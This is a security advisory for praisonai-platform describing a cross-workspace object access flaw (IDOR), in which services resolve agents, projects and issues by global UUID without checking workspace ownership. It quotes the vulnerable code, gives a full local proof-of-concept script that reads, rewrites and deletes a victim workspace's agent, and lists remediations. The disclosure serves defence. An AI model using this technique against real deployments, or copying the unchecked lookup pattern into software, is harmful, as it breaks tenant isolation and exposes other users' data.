# [H] PraisonAI Platform workspace-scoped routes allow cross-workspace object access by global object ID

## Summary
Severity: High
Advisory: GHSA-6h6v-6m7w-7vxx
CVE: CVE-2026-47399
CWE: CWE-284, CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-6h6v-6m7w-7vxx
Type: github-advisory

## Affected
- PyPI: `praisonai-platform` — affected >=0 <0.1.4

## Details
### Summary

PraisonAI Platform's workspace-scoped REST routes contain a systemic object-level authorization flaw that allows an authenticated user from one workspace to access, modify, and delete objects belonging to another workspace by supplying the victim object's global UUID.

The affected pattern appears in workspace-scoped routes such as agents, projects, issues, and comments. The route layer verifies that the caller is a member of the `workspace_id` provided in the URL, but the service layer later resolves the target object by global object ID only. It does not verify that the resolved object actually belongs to the workspace in the URL.

As a result, a valid member of `workspace_attacker` can call a route under:

```text
/api/v1/workspaces/{workspace_attacker}/...
```

while supplying an object UUID from `workspace_victim`. The server authorizes the request based on membership in `workspace_attacker`, then fetches or mutates the victim object by global UUID.

This breaks the platform's workspace isolation boundary.

### Details

The root cause is that workspace membership authorization and object ownership validation are not bound together.

The workspace dependency validates only that the caller is a member of the workspace named in the URL:

```python
# praisonai_platform/api/deps.py
async def require_workspace_member(
    workspace_id: str,
    user: AuthIdentity = Depends(get_current_user),
    session: AsyncSession = Depends(get_db),
    min_role: str = "member",
) -> AuthIdentity:
    member_svc = MemberService(session)
    has = await member_svc.has_role(workspace_id, user.id, min_role)
```

This confirms that the caller has access to the URL workspace. However, it does not prove that the target object belongs to that workspace.

For example, the agent routes are scoped under a workspace path, but object access is performed using only the raw `agent_id`:

```python
# praisonai_platform/api/routes/agents.py
@router.get("/{agent_id}", response_model=AgentResponse)
async def get_agent(workspace_id: str, agent_id: str, ...):
    agent = await svc.get(agent_id)
    return AgentResponse.model_validate(agent)
```

The service method resolves the agent by global UUID only:

```python
# praisonai_platform/services/agent_service.py
async def get(self, agent_id: str) -> Optional[Agent]:
    return await self._session.get(Agent, agent_id)
```

The same pattern is used for update and delete operations:

```python
# praisonai_platform/api/routes/agents.py
agent = await svc.update(agent_id, ...)

deleted = await svc.delete(agent_id)
```

```python
# praisonai_platform/services/agent_service.py
agent = await self.get(agent_id)
...
await self._session.delete(agent)
```

There is no check equivalent to:

```python
agent.workspace_id == workspace_id
```

Therefore, if an attacker is a valid member of any workspace, they can pass their own workspace ID in the URL while supplying an object ID from another workspace.

The same architectural pattern appears in other workspace-scoped object routes, including projects, issues, and comments:

```python
# praisonai_platform/api/routes/projects.py
project = await svc.get(project_id)
project = await svc.update(project_id, ...)
deleted = await svc.delete(project_id)
```

```python
# praisonai_platform/services/project_service.py
return await self._session.get(Project, project_id)
```

```python
# praisonai_platform/api/routes/issues.py
issue = await svc.get(issue_id)
issue = await svc.update(issue_id, ...)
deleted = await svc.delete(issue_id)
comments = await svc.list_for_issue(issue_id)
```

```python
# praisonai_platform/services/issue_service.py
return await self._session.get(Issue, issue_id)
```

```python
# praisonai_platform/services/comment_service.py
select(Comment).where(Comment.issue_id == issue_id)
```

This indicates a systemic object-level access control issue: routes are workspace-scoped, but service-layer object lookups are not workspace-bound.

### PoC

The following local PoC creates a real PraisonAI Platform FastAPI app backed by an in-memory SQLite database, then uses only HTTP requests against the real API routes.

The PoC demonstrates the following chain:

1. An attacker account creates `workspace_attacker`.
2. A victim account creates `workspace_victim`.
3. The victim creates an agent in `workspace_victim`.
4. The attacker sends:

```text
GET /api/v1/workspaces/{workspace_attacker}/agents/{victim_agent_id}
```

5. The server returns the victim agent from `workspace_victim`.
6. The attacker updates the victim agent through the attacker workspace path.
7. The victim observes the attacker-controlled modification.
8. The attacker deletes the victim agent through the attacker workspace path.

Run with:

```bash
PRAISONAI_REPO=/path/to/PraisonAI python -B embedded_poc.py
```

Full PoC:

```python
#!/usr/bin/env python3
from __future__ import annotations

import asyncio
import os
import sys
import types
import uuid
from pathlib import Path

from httpx import ASGITransport, AsyncClient
from sqlalchemy.ext.asyncio import create_async_engine


REPO_ROOT = Path(os.environ.get("PRAISONAI_REPO", "/path/to/PraisonAI")).resolve()
PLATFORM_ROOT = REPO_ROOT / "src" / "praisonai-platform"
AGENTS_ROOT = REPO_ROOT / "src" / "praisonai-agents"


def verify_source() -> None:
    expected = {
        PLATFORM_ROOT / "praisonai_platform/api/deps.py": [
            'min_role: str = "member"',
            "member_svc.has_role(workspace_id, user.id, min_role)",
        ],
        PLATFORM_ROOT / "praisonai_platform/api/routes/agents.py": [
            '@router.get("/{agent_id}", response_model=AgentResponse)',
            "agent = await svc.get(agent_id)",
            '@router.patch("/{agent_id}", response_model=AgentResponse)',
            "agent = await svc.update(",
            '@router.delete("/{agent_id}", status_code=status.HTTP_204_NO_CONTENT)',
            "deleted = await svc.delete(agent_id)",
        ],
        PLATFORM_ROOT / "praisonai_platform/services/agent_service.py": [
            "return await self._session.get(Agent, agent_id)",
            "agent = await self.get(agent_id)",
            "await self._session.delete(agent)",
        ],
    }

    for path, needles in expected.items():
        if not path.exists():
            raise RuntimeError(f"source verification failed: file not found: {path}")

        text = path.read_text(encoding="utf-8")
        for needle in needles:
            if needle not in text:
                raise RuntimeError(f"source verification failed: {needle!r} not found in {path}")


async def main() -> int:
    verify_source()

    sys.path.insert(0, str(PLATFORM_ROOT))
    sys.path.insert(0, str(AGENTS_ROOT))

    if "passlib" not in sys.modules:
        passlib_pkg = types.ModuleType("passlib")
        passlib_pkg.__path__ = []
        sys.modules["passlib"] = passlib_pkg

    if "passlib.context" not in sys.modules:
        passlib_context = types.ModuleType("passlib.context")

        class _CryptContext:
            def __init__(self, *args, **kwargs):
                pass

            def hash(self, password: str) -> str:
                return f"stub::{password}"

            def verify(self, password: str, hashed: str) -> bool:
                return hashed == f"stub::{password}"

        passlib_context.CryptContext = _CryptContext
        sys.modules["passlib.context"] = passlib_context

    os.environ["PLATFORM_JWT_SECRET"] = "test-secret-for-testing-only"

    from praisonai_platform.api.app import create_app
    from praisonai_platform.db.base import Base, reset_engine
    from praisonai_platform.db import base as base_mod

    await reset_engine()

    engine = create_async_engine(
        "sqlite+aiosqlite:///:memory:",
        echo=False,
        connect_args={"check_same_thread": False},
    )

    base_mod._engine = engine
    base_mod._session_factory = None

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    app = create_app()

    suffix = uuid.uuid4().hex[:8]
    password = "Password123!"

    transport = ASGITransport(app=app)

    async with AsyncClient(transport=transport, base_url="http://test") as client:
        attacker = await client.post(
            "/api/v1/auth/register",
            json={
                "email": f"attacker_{suffix}@example.com",
                "password": password,
                "name": f"attacker_{suffix}",
            },
        )

        victim = await client.post(
            "/api/v1/auth/register",
            json={
                "email": f"victim_{suffix}@example.com",
                "password": password,
                "name": f"victim_{suffix}",
            },
        )

        attacker_json = attacker.json()
        victim_json = victim.json()

        attacker_headers = {"Authorization": f"Bearer {attacker_json['token']}"}
        victim_headers = {"Authorization": f"Bearer {victim_json['token']}"}

        attacker_ws = await client.post(
            "/api/v1/workspaces/",
            json={
                "name": f"attacker-ws-{suffix}",
                "slug": f"attacker-ws-{suffix}",
                "description": "attacker workspace",
            },
            headers=attacker_headers,
        )

        victim_ws = await client.post(
            "/api/v1/workspaces/",
            json={
                "name": f"victim-ws-{suffix}",
                "slug": f"victim-ws-{suffix}",
                "description": "victim workspace",
            },
            headers=victim_headers,
        )

        attacker_workspace_id = attacker_ws.json()["id"]
        victim_workspace_id = victim_ws.json()["id"]

        victim_agent = await client.post(
            f"/api/v1/workspaces/{victim_workspace_id}/agents/",
            json={
                "name": "victim-agent",
                "runtime_mode": "local",
                "instructions": "secret instructions",
            },
            headers=victim_headers,
        )

        victim_agent_id = victim_agent.json()["id"]

        attacker_read = await client.get(
            f"/api/v1/workspaces/{attacker_workspace_id}/agents/{victim_agent_id}",
            headers=attacker_headers,
        )

        attacker_update = await client.patch(
            f"/api/v1/workspaces/{attacker_workspace_id}/agents/{victim_agent_id}",
            json={"instructions": "pwned-by-attacker"},
            headers=attacker_headers,
        )

        victim_read_after_update = await client.get(
            f"/api/v1/workspaces/{victim_workspace_id}/agents/{victim_agent_id}",
            headers=victim_headers,
        )

        attacker_delete = await client.delete(
            f"/api/v1/workspaces/{attacker_workspace_id}/agents/{victim_agent_id}",
            headers=attacker_headers,
        )

        victim_read_after_delete = await client.get(
            f"/api/v1/workspaces/{victim_workspace_id}/agents/{victim_agent_id}",
            headers=victim_headers,
        )

        print(f"[poc] attacker_workspace={attacker_workspace_id}")
        print(f"[poc] victim_workspace={victim_workspace_id}")
        print(f"[poc] victim_agent_id={victim_agent_id}")
        print(
            "[poc] attacker_read_status="
            f"{attacker_read.status_code} "
            f"workspace_id={attacker_read.json().get('workspace_id')} "
            f"instructions={attacker_read.json().get('instructions')}"
        )
        print(
            "[poc] attacker_update_status="
            f"{attacker_update.status_code} "
            f"instructions={attacker_update.json().get('instructions')}"
        )
        print(
            "[poc] victim_read_after_update_status="
            f"{victim_read_after_update.status_code} "
            f"instructions={victim_read_after_update.json().get('instructions')}"
        )
        print(f"[poc] attacker_delete_status={attacker_delete.status_code}")
        print(f"[poc] victim_read_after_delete_status={victim_read_after_delete.status_code}")

        if attacker_read.status_code != 200:
            raise SystemExit("[poc] MISS: attacker could not read victim agent")

        if attacker_read.json().get("workspace_id") != victim_workspace_id:
            raise SystemExit("[poc] MISS: read response was not the victim workspace agent")

        if attacker_update.status_code != 200 or attacker_update.json().get("instructions") != "pwned-by-attacker":
            raise SystemExit("[poc] MISS: attacker could not update victim agent")

        if victim_read_after_update.status_code != 200 or victim_read_after_update.json().get("instructions") != "pwned-by-attacker":
            raise SystemExit("[poc] MISS: victim did not observe attacker-controlled update")

        if attacker_delete.status_code != 204:
            raise SystemExit("[poc] MISS: attacker could not delete victim agent")

        if victim_read_after_delete.status_code != 404:
            raise SystemExit("[poc] MISS: victim agent still existed after attacker delete")

        print("[poc] HIT: attacker workspace token read, modified, and deleted a victim workspace agent")

    await engine.dispose()
    base_mod._engine = None
    base_mod._session_factory = None

    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
```

Observed result:

```text
[poc] attacker_workspace=3f7c...
[poc] victim_workspace=be1d...
[poc] victim_agent_id=7f04...
[poc] attacker_read_status=200 workspace_id=be1d... instructions=secret instructions
[poc] attacker_update_status=200 instructions=pwned-by-attacker
[poc] victim_read_after_update_status=200 instructions=pwned-by-attacker
[poc] attacker_delete_status=204
[poc] victim_read_after_delete_status=404
[poc] HIT: attacker workspace token read, modified, and deleted a victim workspace agent
```

This confirms that an authenticated user from one workspace can read, modify, and delete an object belonging to another workspace by using the victim object's UUID through the attacker's own workspace-scoped route.

### Impact

Any authenticated workspace member who knows or obtains object UUIDs from another workspace may be able to:

- read other workspaces' agents;
- read agent instructions and metadata;
- modify victim agents;
- delete victim agents;
- potentially read, modify, or delete projects and issues that follow the same object lookup pattern;
- enumerate comments for issues by raw `issue_id`;
- corrupt activity data, project state, and issue state across workspace boundaries.

This breaks the platform's tenant-isolation boundary. The impact is especially serious in multi-tenant deployments where separate users or teams rely on workspaces as an authorization boundary.

The demonstrated PoC confirms read, update, and delete access against agents. The same root-cause pattern appears in other workspace-scoped object routes and should be audited across the platform.

### Suggested remediation

Recommended fixes:

1. Require every object fetch, update, and delete method to take both `workspace_id` and `object_id`.

2. Enforce object ownership in the service layer. For example:

```python
agent = await self._session.get(Agent, agent_id)
if not agent or agent.workspace_id != workspace_id:
    return None
```

3. Avoid service methods that resolve workspace-owned objects by global UUID alone.

4. Apply the same object-level ownership checks to agents, projects, issues, comments, dependencies, and any other workspace-owned resources.

5. For comment and dependency helpers that pivot from raw `issue_id`, validate that the parent issue belongs to the authorized workspace before returning or modifying child records.

6. Add regression tests for negative cross-workspace access cases, including:

```text
workspace A member cannot read workspace B object
workspace A member cannot update workspace B object
workspace A member cannot delete workspace B object
workspace A member cannot list comments for workspace B issue
```

7. Return `404 Not Found` or `403 Forbidden` consistently when an object does not belong to the authorized workspace.

### Security boundary

This report concerns a workspace tenant-isolation failure. The caller is authenticated, but authentication alone is insufficient. The server must also verify that the requested object belongs to the workspace for which the caller has authorization.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6h6v-6m7w-7vxx
- https://github.com/MervinPraison/PraisonAI
